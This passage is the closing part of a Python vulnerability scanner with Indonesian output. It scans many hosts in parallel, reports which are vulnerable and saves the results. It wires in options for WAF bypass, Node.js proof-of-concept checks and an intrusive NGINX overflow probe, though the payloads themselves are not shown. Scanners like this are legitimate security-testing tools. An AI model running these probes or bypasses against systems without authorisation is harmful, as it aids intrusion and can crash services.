                    f"[*] Timeout NGINX: {nginx_timeout}s",
                    Colors.CYAN,
                )
            )
            if args.nginx_poc:
                print(
                    colorize(
                        "[!] NGINX: probe overflow aktif (intrusif, dapat "
                        "memicu restart worker)",
                        Colors.YELLOW,
                    )
                )
            else:
                print(
                    colorize(
                        "[*] NGINX: deteksi versi pasif (CVE-2026-42945)",
                        Colors.CYAN,
                    )
                )
        if args.insecure:
            print(colorize("[!] Verifikasi TLS dinonaktifkan", Colors.YELLOW))
        if args.ca_bundle:
            print(
                colorize(
                    "[*] CA bundle tambahan: "
                    + terminal_safe(args.ca_bundle),
                    Colors.CYAN,
                )
            )
        if args.system_ca:
            print(colorize("[*] Trust store CA sistem: digunakan", Colors.CYAN))
        print()

    results: List[dict] = []

    def scan(host: str) -> dict:
        return scan_host(
            host,
            mode=args.mode,
            timeout=args.timeout,
            verify_ssl=verify_ssl,
            custom_headers=custom_headers,
            sapi=args.sapi,
            paths=paths,
            safe_check=args.safe_check,
            windows=args.windows,
            waf_bypass=args.waf_bypass,
            waf_bypass_size_kb=args.waf_bypass_size,
            vercel_waf_bypass=args.vercel_waf_bypass,
            nodejs_poc=args.nodejs_poc,
            nginx_poc=args.nginx_poc,
            baseline=not args.no_baseline,
        )

    if args.mode in ("php", "all") and len(hosts) > 1:
        for probe in PHP_PROBES:
            php_build_probe_body(*probe)

    if len(hosts) == 1:
        result = scan(hosts[0])
        results.append(result)
        if not args.quiet or result["vulnerable"] is True:
            print_result(result, args.verbose)
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(scan, host): host for host in hosts}
            with tqdm(
                total=len(hosts),
                desc=colorize("Memindai", Colors.CYAN),
                unit="host",
                ncols=80,
                disable=args.quiet,
            ) as progress:
                for future in as_completed(futures):
                    result = future.result()
                    results.append(result)

                    should_print = result["vulnerable"] is True or (
                        not args.quiet and args.verbose
                    )
                    if should_print:
                        if args.quiet:
                            print_result(result, args.verbose)
                        else:
                            with tqdm.external_write_mode():
                                print_result(result, args.verbose)
                    progress.update(1)

    vulnerable_count = sum(
        result["vulnerable"] is True for result in results
    )
    error_count = sum(
        result.get("verdict") == "ERROR" for result in results
    )
    inconclusive_count = sum(
        result["vulnerable"] is None
        and result.get("verdict") != "ERROR"
        for result in results
    )
    not_vulnerable_count = sum(
        result["vulnerable"] is False for result in results
    )
    if not args.quiet:
        print()
        print(colorize("=" * 60, Colors.CYAN))
        print(colorize("RINGKASAN PEMINDAIAN", Colors.BOLD))
        print(colorize("=" * 60, Colors.CYAN))
        print(f"  Total host dipindai: {len(hosts)}")
        vulnerable_label = f"Rentan: {vulnerable_count}"
        if vulnerable_count:
            vulnerable_label = colorize(
                vulnerable_label, Colors.RED + Colors.BOLD
            )
        print(f"  {vulnerable_label}")
        print(f"  Tidak rentan: {not_vulnerable_count}")
        print(f"  Tidak konklusif: {inconclusive_count}")
        print(f"  Galat: {error_count}")
        print(colorize("=" * 60, Colors.CYAN))

    output_saved = True
    if args.output:
        output_saved = save_results(
            results,
            args.output,
            args.mode,
            vulnerable_only=not args.all_results,
            announce=not args.quiet,
        )
    if not output_saved:
        raise SystemExit(2)
    raise SystemExit(1 if vulnerable_count else 0)


if __name__ == "__main__":
    main()




